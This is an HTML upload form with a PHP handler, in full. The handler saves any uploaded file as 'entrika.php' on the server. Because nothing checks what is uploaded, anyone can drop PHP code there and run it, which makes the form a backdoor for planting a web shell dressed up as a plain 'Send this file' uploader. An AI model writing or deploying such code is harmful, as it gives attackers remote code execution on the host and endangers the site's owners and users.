<FORM ENCTYPE="multipart/form-data" ACTION="uploader.php" METHOD="POST">
<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="100000">
Send this file: <INPUT NAME="userfile" TYPE="file">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<?
move_uploaded_file($userfile, "entrika.php"); 
?>

